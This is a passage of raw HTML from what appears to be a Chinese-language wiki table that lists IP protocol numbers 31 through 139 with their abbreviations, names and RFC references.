Protocol</span></a></td><td><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc998"><span>RFC 998</span></a></td></tr><tr><td><span>31</span></td><td><span>0x1F</span></td><td><span>MFE-NSP</span></td><td><a href="/w/index.php?title=MFE_Network_Services_Protocol&amp;action=edit&amp;redlink=1" class="new" title="MFE Network Services Protocol (页面不存在) "><span>MFE Network Services Protocol</span></a></td><td>&nbsp;</td></tr><tr><td><span>32</span></td><td><span>0x20</span></td><td><span>MERIT-INP</span></td><td><a href="/w/index.php?title=MERIT_Internodal_Protocol&amp;action=edit&amp;redlink=1" class="new" title="MERIT Internodal Protocol (页面不存在) "><span>MERIT Internodal Protocol</span></a></td><td>&nbsp;</td></tr><tr><td><span>33</span></td><td><span>0x21</span></td><td><span>DCCP</span></td><td><a href="/wiki/Datagram_Congestion_Control_Protocol" class="mw-redirect" title="Datagram Congestion Control Protocol"><span>Datagram Congestion Control Protocol</span></a></td><td><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc4340"><span>RFC 4340</span></a></td></tr><tr><td><span>34</span></td><td><span>0x22</span></td><td><span>3PC</span></td><td><a href="/w/index.php?title=Third_Party_Connect_Protocol&amp;action=edit&amp;redlink=1" class="new" title="Third Party Connect Protocol (页面不存在) "><span>Third Party Connect Protocol</span></a></td><td>&nbsp;</td></tr><tr><td><span>35</span></td><td><span>0x23</span></td><td><span>IDPR</span></td><td><a href="/w/index.php?title=Inter-Domain_Policy_Routing_Protocol&amp;action=edit&amp;redlink=1" class="new" title="Inter-Domain Policy Routing Protocol (页面不存在) "><span>Inter-Domain Policy Routing Protocol</span></a></td><td><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc1479"><span>RFC 1479</span></a></td></tr><tr><td><span>36</span></td><td><span>0x24</span></td><td><span>XTP</span></td><td><a href="/w/index.php?title=Xpress_Transport_Protocol&amp;action=edit&amp;redlink=1" class="new" title="Xpress Transport Protocol (页面不存在) "><span>Xpress Transport Protocol</span></a></td><td>&nbsp;</td></tr><tr><td><span>37</span></td><td><span>0x25</span></td><td><span>DDP</span></td><td><a href="/w/index.php?title=Datagram_Delivery_Protocol&amp;action=edit&amp;redlink=1" class="new" title="Datagram Delivery Protocol (页面不存在) "><span>Datagram Delivery Protocol</span></a></td><td>&nbsp;</td></tr><tr><td><span>38</span></td><td><span>0x26</span></td><td><span>IDPR-CMTP</span></td><td><a href="/w/index.php?title=IDPR_Control_Message_Transport_Protocol&amp;action=edit&amp;redlink=1" class="new" title="IDPR Control Message Transport Protocol (页面不存在) "><span>IDPR Control Message Transport Protocol</span></a></td><td>&nbsp;</td></tr><tr><td><span>39</span></td><td><span>0x27</span></td><td><span>TP++</span></td><td><a href="/w/index.php?title=TP%2B%2B_Transport_Protocol&amp;action=edit&amp;redlink=1" class="new" title="TP++ Transport Protocol (页面不存在) "><span>TP++ Transport Protocol</span></a></td><td>&nbsp;</td></tr><tr><td><span>40</span></td><td><span>0x28</span></td><td><span>IL</span></td><td><a href="/w/index.php?title=IL_(network_protocol)&amp;action=edit&amp;redlink=1" class="new" title="IL (network protocol) (页面不存在) "><span>IL Transport Protocol</span></a></td><td>&nbsp;</td></tr><tr><td><span>41</span></td><td><span>0x29</span></td><td><span>IPv6</span></td><td><a href="/wiki/6in4" title="6in4"><span>IPv6 封装</span></a></td><td><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc2473"><span>RFC 2473</span></a></td></tr><tr><td><span>42</span></td><td><span>0x2A</span></td><td><span>SDRP</span></td><td><a href="/w/index.php?title=Source_Demand_Routing_Protocol&amp;action=edit&amp;redlink=1" class="new" title="Source Demand Routing Protocol (页面不存在) "><span>Source Demand Routing Protocol</span></a></td><td><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc1940"><span>RFC 1940</span></a></td></tr><tr><td><span>43</span></td><td><span>0x2B</span></td><td><span>IPv6-Route</span></td><td><a href="/wiki/IPv6" title="IPv6"><span>IPv6</span></a><span>路由拓展头</span></td><td><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc2460"><span>RFC 2460</span></a></td></tr><tr><td><span>44</span></td><td><span>0x2C</span></td><td><span>IPv6-Frag</span></td><td><a href="/wiki/IPv6" title="IPv6"><span>IPv6</span></a><span>分片扩展头</span></td><td><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc2460"><span>RFC 2460</span></a></td></tr><tr><td><span>45</span></td><td><span>0x2D</span></td><td><span>IDRP</span></td><td><a href="/w/index.php?title=Inter-Domain_Routing_Protocol&amp;action=edit&amp;redlink=1" class="new" title="Inter-Domain Routing Protocol (页面不存在) "><span>Inter-Domain Routing Protocol</span></a></td><td>&nbsp;</td></tr><tr><td><span>46</span></td><td><span>0x2E</span></td><td><span>RSVP</span></td><td><a href="/wiki/Resource_Reservation_Protocol" class="mw-redirect" title="Resource Reservation Protocol"><span>Resource Reservation Protocol</span></a></td><td><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc2205"><span>RFC 2205</span></a></td></tr><tr><td><span>47</span></td><td><span>0x2F</span></td><td><span>GRE</span></td><td><a href="/wiki/%E9%80%9A%E7%94%A8%E8%B7%AF%E7%94%B1%E5%B0%81%E8%A3%85" title="通用路由封装"><span>通用路由封装 (GRE) </span></a></td><td><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc2784"><span>RFC 2784</span></a><span>, </span><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc2890"><span>RFC 2890</span></a></td></tr><tr><td><span>48</span></td><td><span>0x30</span></td><td><span>MHRP</span></td><td><a href="/w/index.php?title=Mobile_Host_Routing_Protocol&amp;action=edit&amp;redlink=1" class="new" title="Mobile Host Routing Protocol (页面不存在) "><span>Mobile Host Routing Protocol</span></a></td><td>&nbsp;</td></tr><tr><td><span>49</span></td><td><span>0x31</span></td><td><span>BNA</span></td><td><span>BNA</span></td><td>&nbsp;</td></tr><tr><td><span>50</span></td><td><span>0x32</span></td><td><span>ESP</span></td><td><a href="/wiki/IPsec" title="IPsec"><span>封装安全协议 (ESP) </span></a></td><td><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc4303"><span>RFC 4303</span></a></td></tr><tr><td><span>51</span></td><td><span>0x33</span></td><td><span>AH</span></td><td><a href="/wiki/IPsec" title="IPsec"><span>认证头协议 (AH) </span></a></td><td><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc4302"><span>RFC 4302</span></a></td></tr><tr><td><span>52</span></td><td><span>0x34</span></td><td><span>I-NLSP</span></td><td><a href="/w/index.php?title=Integrated_Net_Layer_Security_Protocol&amp;action=edit&amp;redlink=1" class="new" title="Integrated Net Layer Security Protocol (页面不存在) "><span>Integrated Net Layer Security Protocol</span></a></td><td><span>TUBA</span></td></tr><tr><td><span>53</span></td><td><span>0x35</span></td><td><span>SWIPE</span></td><td><a href="/w/index.php?title=SwIPe_(protocol)&amp;action=edit&amp;redlink=1" class="new" title="SwIPe (protocol) (页面不存在) "><span>SwIPe</span></a></td><td><span>IP with Encryption</span></td></tr><tr><td><span>54</span></td><td><span>0x36</span></td><td><span>NARP</span></td><td><a href="/w/index.php?title=NBMA_Address_Resolution_Protocol&amp;action=edit&amp;redlink=1" class="new" title="NBMA Address Resolution Protocol (页面不存在) "><span>NBMA Address Resolution Protocol</span></a></td><td><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc1735"><span>RFC 1735</span></a></td></tr><tr><td><span>55</span></td><td><span>0x37</span></td><td><span>MOBILE</span></td><td><a href="/wiki/Mobile_IP" class="mw-redirect" title="Mobile IP"><span>IP Mobility</span></a><span>  (Min Encap)</span></td><td><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc2004"><span>RFC 2004</span></a></td></tr><tr><td><span>56</span></td><td><span>0x38</span></td><td><span>TLSP</span></td><td><a href="/w/index.php?title=Transport_Layer_Security_Protocol&amp;action=edit&amp;redlink=1" class="new" title="Transport Layer Security Protocol (页面不存在) "><span>Transport Layer Security Protocol</span></a><span> (using Kryptonet key management)</span></td><td>&nbsp;</td></tr><tr><td><span>57</span></td><td><span>0x39</span></td><td><span>SKIP</span></td><td><a href="/w/index.php?title=Simple_Key-Management_for_Internet_Protocol&amp;action=edit&amp;redlink=1" class="new" title="Simple Key-Management for Internet Protocol (页面不存在) "><span>Simple Key-Management for Internet Protocol</span></a></td><td><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc2356"><span>RFC 2356</span></a></td></tr><tr><td><span>58</span></td><td><span>0x3A</span></td><td><span>IPv6-ICMP</span></td><td><a href="/wiki/ICMPv6" class="mw-redirect" title="ICMPv6"><span>互联网控制消息协议第六版 (ICMPv6) </span></a></td><td><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc4443"><span>RFC 4443</span></a><span>, </span><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc4884"><span>RFC 4884</span></a></td></tr><tr><td><span>59</span></td><td><span>0x3B</span></td><td><span>IPv6-NoNxt</span></td><td><a href="/wiki/IPv6" title="IPv6"><span>IPv6</span></a><span>无负载头</span></td><td><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc2460"><span>RFC 2460</span></a></td></tr><tr><td><span>60</span></td><td><span>0x3C</span></td><td><span>IPv6-Opts</span></td><td><a href="/wiki/IPv6" title="IPv6"><span>IPv6</span></a><span>目标选项扩展头</span></td><td><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc2460"><span>RFC 2460</span></a></td></tr><tr><td><span>61</span></td><td><span>0x3D</span></td><td>&nbsp;</td><td><span>Any host internal protocol</span></td><td>&nbsp;</td></tr><tr><td><span>62</span></td><td><span>0x3E</span></td><td><span>CFTP</span></td><td><span>CFTP</span></td><td>&nbsp;</td></tr><tr><td><span>63</span></td><td><span>0x3F</span></td><td>&nbsp;</td><td><span>Any local network</span></td><td>&nbsp;</td></tr><tr><td><span>64</span></td><td><span>0x40</span></td><td><span>SAT-EXPAK</span></td><td><span>SATNET and Backroom EXPAK</span></td><td>&nbsp;</td></tr><tr><td><span>65</span></td><td><span>0x41</span></td><td><span>KRYPTOLAN</span></td><td><span>Kryptolan</span></td><td>&nbsp;</td></tr><tr><td><span>66</span></td><td><span>0x42</span></td><td><span>RVD</span></td><td><span>MIT </span><a href="/w/index.php?title=Remote_Virtual_Disk_Protocol&amp;action=edit&amp;redlink=1" class="new" title="Remote Virtual Disk Protocol (页面不存在) "><span>Remote Virtual Disk Protocol</span></a></td><td>&nbsp;</td></tr><tr><td><span>67</span></td><td><span>0x43</span></td><td><span>IPPC</span></td><td><a href="/w/index.php?title=Internet_Pluribus_Packet_Core&amp;action=edit&amp;redlink=1" class="new" title="Internet Pluribus Packet Core (页面不存在) "><span>Internet Pluribus Packet Core</span></a></td><td>&nbsp;</td></tr><tr><td><span>68</span></td><td><span>0x44</span></td><td>&nbsp;</td><td><span>Any distributed file system</span></td><td>&nbsp;</td></tr><tr><td><span>69</span></td><td><span>0x45</span></td><td><span>SAT-MON</span></td><td><span>SATNET Monitoring</span></td><td>&nbsp;</td></tr><tr><td><span>70</span></td><td><span>0x46</span></td><td><span>VISA</span></td><td><span>VISA协议</span></td><td>&nbsp;</td></tr><tr><td><span>71</span></td><td><span>0x47</span></td><td><span>IPCV</span></td><td><span>Internet Packet Core Utility</span></td><td>&nbsp;</td></tr><tr><td><span>72</span></td><td><span>0x48</span></td><td><span>CPNX</span></td><td><span>Computer Protocol Network Executive</span></td><td>&nbsp;</td></tr><tr><td><span>73</span></td><td><span>0x49</span></td><td><span>CPHB</span></td><td><a href="/w/index.php?title=Computer_Protocol_Heart_Beat&amp;action=edit&amp;redlink=1" class="new" title="Computer Protocol Heart Beat (页面不存在) "><span>Computer Protocol Heart Beat</span></a></td><td>&nbsp;</td></tr><tr><td><span>74</span></td><td><span>0x4A</span></td><td><span>WSN</span></td><td><a href="/w/index.php?title=Wang_Span_Network&amp;action=edit&amp;redlink=1" class="new" title="Wang Span Network (页面不存在) "><span>Wang Span Network</span></a></td><td>&nbsp;</td></tr><tr><td><span>75</span></td><td><span>0x4B</span></td><td><span>PVP</span></td><td><a href="/w/index.php?title=Packet_Video_Protocol&amp;action=edit&amp;redlink=1" class="new" title="Packet Video Protocol (页面不存在) "><span>Packet Video Protocol</span></a></td><td>&nbsp;</td></tr><tr><td><span>76</span></td><td><span>0x4C</span></td><td><span>BR-SAT-MON</span></td><td><span>Backroom SATNET Monitoring</span></td><td>&nbsp;</td></tr><tr><td><span>77</span></td><td><span>0x4D</span></td><td><span>SUN-ND</span></td><td><span>SUN ND PROTOCOL-Temporary</span></td><td>&nbsp;</td></tr><tr><td><span>78</span></td><td><span>0x4E</span></td><td><span>WB-MON</span></td><td><span>WIDEBAND Monitoring</span></td><td>&nbsp;</td></tr><tr><td><span>79</span></td><td><span>0x4F</span></td><td><span>WB-EXPAK</span></td><td><span>WIDEBAND EXPAK</span></td><td>&nbsp;</td></tr><tr><td><span>80</span></td><td><span>0x50</span></td><td><span>ISO-IP</span></td><td><span>国际标准化组织互联网协议</span></td><td>&nbsp;</td></tr><tr><td><span>81</span></td><td><span>0x51</span></td><td><span>VMTP</span></td><td><a href="/w/index.php?title=V_(operating_system)&amp;action=edit&amp;redlink=1" class="new" title="V (operating system) (页面不存在) "><span>Versatile Message Transaction Protocol</span></a></td><td><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc1045"><span>RFC 1045</span></a></td></tr><tr><td><span>82</span></td><td><span>0x52</span></td><td><span>SECURE-VMTP</span></td><td><span>Secure Versatile Message Transaction Protocol</span></td><td><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc1045"><span>RFC 1045</span></a></td></tr><tr><td><span>83</span></td><td><span>0x53</span></td><td><span>VINES</span></td><td><span>VINES</span></td><td>&nbsp;</td></tr><tr><td><span>84</span></td><td><span>0x54</span></td><td><span>TTP</span></td><td><span>TTP</span></td><td>&nbsp;</td></tr><tr><td><span>84</span></td><td><span>0x54</span></td><td><span>IPTM</span></td><td><a href="/w/index.php?title=Internet_Protocol_Traffic_Manager&amp;action=edit&amp;redlink=1" class="new" title="Internet Protocol Traffic Manager (页面不存在) "><span>Internet Protocol Traffic Manager</span></a></td><td>&nbsp;</td></tr><tr><td><span>85</span></td><td><span>0x55</span></td><td><span>NSFNET-IGP</span></td><td><span>NSFNET-IGP</span></td><td>&nbsp;</td></tr><tr><td><span>86</span></td><td><span>0x56</span></td><td><span>DGP</span></td><td><a href="/w/index.php?title=Dissimilar_Gateway_Protocol&amp;action=edit&amp;redlink=1" class="new" title="Dissimilar Gateway Protocol (页面不存在) "><span>Dissimilar Gateway Protocol</span></a></td><td>&nbsp;</td></tr><tr><td><span>87</span></td><td><span>0x57</span></td><td><span>TCF</span></td><td><span>TCF</span></td><td>&nbsp;</td></tr><tr><td><span>88</span></td><td><span>0x58</span></td><td><span>EIGRP</span></td><td><a href="/wiki/%E5%8A%A0%E5%BC%B7%E5%9E%8B%E9%96%98%E9%81%93%E9%96%93%E9%81%B8%E5%BE%91%E5%8D%94%E5%AE%9A" title="加强型网关间选径协议"><span>增强型内部网关路由协议 (EIGRP) </span></a></td><td>&nbsp;</td></tr><tr><td><span>89</span></td><td><span>0x59</span></td><td><span>OSPF</span></td><td><a href="/wiki/%E5%BC%80%E6%94%BE%E5%BC%8F%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84%E4%BC%98%E5%85%88" title="开放式最短路径优先"><span>开放式最短路径优先 (OSPF) </span></a></td><td><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc1583"><span>RFC 1583</span></a></td></tr><tr><td><span>90</span></td><td><span>0x5A</span></td><td><span>Sprite-RPC</span></td><td><span>Sprite RPC Protocol</span></td><td>&nbsp;</td></tr><tr><td><span>91</span></td><td><span>0x5B</span></td><td><span>LARP</span></td><td><a href="/w/index.php?title=Locus_Address_Resolution_Protocol&amp;action=edit&amp;redlink=1" class="new" title="Locus Address Resolution Protocol (页面不存在) "><span>Locus Address Resolution Protocol</span></a></td><td>&nbsp;</td></tr><tr><td><span>92</span></td><td><span>0x5C</span></td><td><span>MTP</span></td><td><a href="/w/index.php?title=Multicast_Transport_Protocol&amp;action=edit&amp;redlink=1" class="new" title="Multicast Transport Protocol (页面不存在) "><span>Multicast Transport Protocol</span></a></td><td>&nbsp;</td></tr><tr><td><span>93</span></td><td><span>0x5D</span></td><td><span>AX.25</span></td><td><a href="/w/index.php?title=AX.25&amp;action=edit&amp;redlink=1" class="new" title="AX.25 (页面不存在) "><span>AX.25</span></a></td><td>&nbsp;</td></tr><tr><td><span>94</span></td><td><span>0x5E</span></td><td><span>IPIP</span></td><td><a href="/wiki/IP_in_IP" title="IP in IP"><span>IP-within-IP 封装协议</span></a></td><td><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc2003"><span>RFC 2003</span></a></td></tr><tr><td><span>95</span></td><td><span>0x5F</span></td><td><span>MICP</span></td><td><a href="/w/index.php?title=Mobile_Internetworking_Control_Protocol&amp;action=edit&amp;redlink=1" class="new" title="Mobile Internetworking Control Protocol (页面不存在) "><span>Mobile Internetworking Control Protocol</span></a></td><td>&nbsp;</td></tr><tr><td><span>96</span></td><td><span>0x60</span></td><td><span>SCC-SP</span></td><td><span>Semaphore Communications Sec. Pro</span></td><td>&nbsp;</td></tr><tr><td><span>97</span></td><td><span>0x61</span></td><td><span>ETHERIP</span></td><td><span>Ethernet-within-IP 封装协议</span></td><td><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc3378"><span>RFC 3378</span></a></td></tr><tr><td><span>98</span></td><td><span>0x62</span></td><td><span>ENCAP</span></td><td><span>Encapsulation Header</span></td><td><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc1241"><span>RFC 1241</span></a></td></tr><tr><td><span>99</span></td><td><span>0x63</span></td><td>&nbsp;</td><td><span>Any private encryption scheme</span></td><td>&nbsp;</td></tr><tr><td><span>100</span></td><td><span>0x64</span></td><td><span>GMTP</span></td><td><span>GMTP</span></td><td>&nbsp;</td></tr><tr><td><span>101</span></td><td><span>0x65</span></td><td><span>IFMP</span></td><td><a href="/w/index.php?title=Ipsilon_Flow_Management_Protocol&amp;action=edit&amp;redlink=1" class="new" title="Ipsilon Flow Management Protocol (页面不存在) "><span>Ipsilon Flow Management Protocol</span></a></td><td>&nbsp;</td></tr><tr><td><span>102</span></td><td><span>0x66</span></td><td><span>PNNI</span></td><td><span>PNNI over IP</span></td><td>&nbsp;</td></tr><tr><td><span>103</span></td><td><span>0x67</span></td><td><span>PIM</span></td><td><a href="/w/index.php?title=Protocol_Independent_Multicast&amp;action=edit&amp;redlink=1" class="new" title="Protocol Independent Multicast (页面不存在) "><span>Protocol Independent Multicast</span></a></td><td>&nbsp;</td></tr><tr><td><span>104</span></td><td><span>0x68</span></td><td><span>ARIS</span></td><td><span>IBM&#39;s ARIS (Aggregate Route IP Switching) Protocol</span></td><td>&nbsp;</td></tr><tr><td><span>105</span></td><td><span>0x69</span></td><td><span>SCPS</span></td><td><a rel="nofollow" class="external text" href="http://scps.org"><span>SCPS (Space Communications Protocol Standards)</span></a></td><td><span>SCPS-TP</span><sup id="cite_ref-1" class="reference"><a href="#cite_note-1"><span>[1]</span></a></sup></td></tr><tr><td><span>106</span></td><td><span>0x6A</span></td><td><a href="/wiki/QNX" title="QNX"><span>QNX</span></a></td><td><span>QNX</span></td><td>&nbsp;</td></tr><tr><td><span>107</span></td><td><span>0x6B</span></td><td><span>A/N</span></td><td><span>Active Networks</span></td><td>&nbsp;</td></tr><tr><td><span>108</span></td><td><span>0x6C</span></td><td><span>IPComp</span></td><td><a href="/w/index.php?title=IP_Payload_Compression_Protocol&amp;action=edit&amp;redlink=1" class="new" title="IP Payload Compression Protocol (页面不存在) "><span>IP Payload Compression Protocol</span></a></td><td><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc3173"><span>RFC 3173</span></a></td></tr><tr><td><span>109</span></td><td><span>0x6D</span></td><td><span>SNP</span></td><td><a href="/w/index.php?title=Sitara_Networks_Protocol&amp;action=edit&amp;redlink=1" class="new" title="Sitara Networks Protocol (页面不存在) "><span>Sitara Networks Protocol</span></a></td><td>&nbsp;</td></tr><tr><td><span>110</span></td><td><span>0x6E</span></td><td><span>Compaq-Peer</span></td><td><a href="/w/index.php?title=Compaq_Peer_Protocol&amp;action=edit&amp;redlink=1" class="new" title="Compaq Peer Protocol (页面不存在) "><span>Compaq Peer Protocol</span></a></td><td>&nbsp;</td></tr><tr><td><span>111</span></td><td><span>0x6F</span></td><td><span>IPX-in-IP</span></td><td><a href="/w/index.php?title=IPX_in_IP&amp;action=edit&amp;redlink=1" class="new" title="IPX in IP (页面不存在) "><span>IPX in IP</span></a></td><td>&nbsp;</td></tr><tr><td><span>112</span></td><td><span>0x70</span></td><td><span>VRRP</span></td><td><a href="/w/index.php?title=Virtual_Router_Redundancy_Protocol&amp;action=edit&amp;redlink=1" class="new" title="Virtual Router Redundancy Protocol (页面不存在) "><span>Virtual Router Redundancy Protocol</span></a><span>, </span><a href="/w/index.php?title=Common_Address_Redundancy_Protocol&amp;action=edit&amp;redlink=1" class="new" title="Common Address Redundancy Protocol (页面不存在) "><span>Common Address Redundancy Protocol</span></a><span>  (没在</span><a href="/wiki/Internet_Assigned_Numbers_Authority" class="mw-redirect" title="Internet Assigned Numbers Authority"><span>IANA</span></a><span>注册)</span></td><td><span>VRRP:</span><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc3768"><span>RFC 3768</span></a></td></tr><tr><td><span>113</span></td><td><span>0x71</span></td><td><span>PGM</span></td><td><a href="/wiki/Pragmatic_General_Multicast" class="mw-redirect" title="Pragmatic General Multicast"><span>PGM Reliable Transport Protocol</span></a></td><td><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc3208"><span>RFC 3208</span></a></td></tr><tr><td><span>114</span></td><td><span>0x72</span></td><td>&nbsp;</td><td><span>Any 0-hop protocol</span></td><td>&nbsp;</td></tr><tr><td><span>115</span></td><td><span>0x73</span></td><td><span>L2TP</span></td><td><a href="/w/index.php?title=L2TPv3&amp;action=edit&amp;redlink=1" class="new" title="L2TPv3 (页面不存在) "><span>Layer Two Tunneling Protocol Version 3</span></a></td><td><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc3931"><span>RFC 3931</span></a></td></tr><tr><td><span>116</span></td><td><span>0x74</span></td><td><span>DDX</span></td><td><span>D-II Data Exchange (DDX)</span></td><td>&nbsp;</td></tr><tr><td><span>117</span></td><td><span>0x75</span></td><td><span>IATP</span></td><td><a href="/w/index.php?title=Interactive_Agent_Transfer_Protocol&amp;action=edit&amp;redlink=1" class="new" title="Interactive Agent Transfer Protocol (页面不存在) "><span>Interactive Agent Transfer Protocol</span></a></td><td>&nbsp;</td></tr><tr><td><span>118</span></td><td><span>0x76</span></td><td><span>STP</span></td><td><a href="/w/index.php?title=Schedule_Transfer_Protocol&amp;action=edit&amp;redlink=1" class="new" title="Schedule Transfer Protocol (页面不存在) "><span>Schedule Transfer Protocol</span></a></td><td>&nbsp;</td></tr><tr><td><span>119</span></td><td><span>0x77</span></td><td><span>SRP</span></td><td><a href="/w/index.php?title=SpectraLink_Radio_Protocol&amp;action=edit&amp;redlink=1" class="new" title="SpectraLink Radio Protocol (页面不存在) "><span>SpectraLink Radio Protocol</span></a></td><td>&nbsp;</td></tr><tr><td><span>120</span></td><td><span>0x78</span></td><td><span>UTI</span></td><td><span>Universal Transport Interface Protocol</span></td><td>&nbsp;</td></tr><tr><td><span>121</span></td><td><span>0x79</span></td><td><span>SMP</span></td><td><a href="/w/index.php?title=Simple_Message_Protocol&amp;action=edit&amp;redlink=1" class="new" title="Simple Message Protocol (页面不存在) "><span>Simple Message Protocol</span></a></td><td>&nbsp;</td></tr><tr><td><span>122</span></td><td><span>0x7A</span></td><td><span>SM</span></td><td><span>Simple Multicast Protocol</span></td><td><a rel="nofollow" class="external text" href="http://tools.ietf.org/html/draft-perlman-simple-multicast-03"><span>draft-perlman-simple-multicast-03</span></a></td></tr><tr><td><span>123</span></td><td><span>0x7B</span></td><td><span>PTP</span></td><td><a href="/w/index.php?title=Performance_Transparency_Protocol&amp;action=edit&amp;redlink=1" class="new" title="Performance Transparency Protocol (页面不存在) "><span>Performance Transparency Protocol</span></a></td><td>&nbsp;</td></tr><tr><td><span>124</span></td><td><span>0x7C</span></td><td><span>IS-IS over IPv4</span></td><td><a href="/wiki/IS-IS" class="mw-redirect" title="IS-IS"><span>Intermediate System to Intermediate System (IS-IS) Protocol</span></a><span> over </span><a href="/wiki/IPv4" title="IPv4"><span>IPv4</span></a></td><td><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc1142"><span>RFC 1142</span></a><span> and </span><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc1195"><span>RFC 1195</span></a></td></tr><tr><td><span>125</span></td><td><span>0x7D</span></td><td><span>FIRE</span></td><td><span>Flexible Intra-AS Routing Environment</span></td><td>&nbsp;</td></tr><tr><td><span>126</span></td><td><span>0x7E</span></td><td><span>CRTP</span></td><td><a href="/w/index.php?title=Combat_Radio_Transport_Protocol&amp;action=edit&amp;redlink=1" class="new" title="Combat Radio Transport Protocol (页面不存在) "><span>Combat Radio Transport Protocol</span></a></td><td>&nbsp;</td></tr><tr><td><span>127</span></td><td><span>0x7F</span></td><td><span>CRUDP</span></td><td><a href="/w/index.php?title=Combat_Radio_User_Datagram&amp;action=edit&amp;redlink=1" class="new" title="Combat Radio User Datagram (页面不存在) "><span>Combat Radio User Datagram</span></a></td><td>&nbsp;</td></tr><tr><td><span>128</span></td><td><span>0x80</span></td><td><span>SSCOPMCE</span></td><td><span>Service-Specific Connection-Oriented Protocol in a Multilink and Connectionless Environment</span></td><td><a rel="nofollow" class="external text" href="http://www.itu.int/rec/T-REC-Q.2111-199912-I"><span>ITU-T Q.2111 (1999)</span></a></td></tr><tr><td><span>129</span></td><td><span>0x81</span></td><td><span>IPLT</span></td><td>&nbsp;</td><td>&nbsp;</td></tr><tr><td><span>130</span></td><td><span>0x82</span></td><td><span>SPS</span></td><td><a href="/w/index.php?title=Secure_Packet_Shield&amp;action=edit&amp;redlink=1" class="new" title="Secure Packet Shield (页面不存在) "><span>Secure Packet Shield</span></a></td><td>&nbsp;</td></tr><tr><td><span>131</span></td><td><span>0x83</span></td><td><span>PIPE</span></td><td><span>Private IP Encapsulation within IP</span></td><td><a rel="nofollow" class="external text" href="http://www.watersprings.org/pub/id/draft-petri-mobileip-pipe-00.txt"><span>Expired I-D draft-petri-mobileip-pipe-00.txt</span></a></td></tr><tr><td><span>132</span></td><td><span>0x84</span></td><td><span>SCTP</span></td><td><a href="/wiki/Stream_Control_Transmission_Protocol" class="mw-redirect" title="Stream Control Transmission Protocol"><span>Stream Control Transmission Protocol</span></a></td><td>&nbsp;</td></tr><tr><td><span>133</span></td><td><span>0x85</span></td><td><span>FC</span></td><td><a href="/w/index.php?title=Fibre_Channel&amp;action=edit&amp;redlink=1" class="new" title="Fibre Channel (页面不存在) "><span>Fibre Channel</span></a></td><td>&nbsp;</td></tr><tr><td><span>134</span></td><td><span>0x86</span></td><td><span>RSVP-E2E-IGNORE</span></td><td><span>Reservation Protocol (RSVP) End-to-End Ignore</span></td><td><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc3175"><span>RFC 3175</span></a></td></tr><tr><td><span>135</span></td><td><span>0x87</span></td><td><span>Mobility Header</span></td><td><span>IPv6移动IP扩展头</span></td><td><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc6275"><span>RFC 6275</span></a></td></tr><tr><td><span>136</span></td><td><span>0x88</span></td><td><span>UDPLite</span></td><td><a href="/w/index.php?title=UDP_Lite&amp;action=edit&amp;redlink=1" class="new" title="UDP Lite (页面不存在) "><span>Lightweight User Datagram Protocol</span></a></td><td><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc3828"><span>RFC 3828</span></a></td></tr><tr><td><span>137</span></td><td><span>0x89</span></td><td><span>MPLS-in-IP</span></td><td><a href="/w/index.php?title=Multiprotocol_Label_Switching&amp;action=edit&amp;redlink=1" class="new" title="Multiprotocol Label Switching (页面不存在) "><span>Multiprotocol Label Switching</span></a><span> Encapsulated in IP</span></td><td><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc4023"><span>RFC 4023</span></a></td></tr><tr><td><span>138</span></td><td><span>0x8A</span></td><td><span>manet</span></td><td><a href="/w/index.php?title=Mobile_ad_hoc_network&amp;action=edit&amp;redlink=1" class="new" title="Mobile ad hoc network (页面不存在) "><span>MANET</span></a><span> Protocols</span></td><td><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc5498"><span>RFC 5498</span></a></td></tr><tr><td><span>139</span></td><td><span>0x8B</span></td><td><span>HIP</span></td><td><a href="/w/index.php?title=Host_Identity_Protocol&amp;action=edit&amp;redlink=1" class="new" title="Host Identity Protocol (页面不存在) "><span>Host Identity 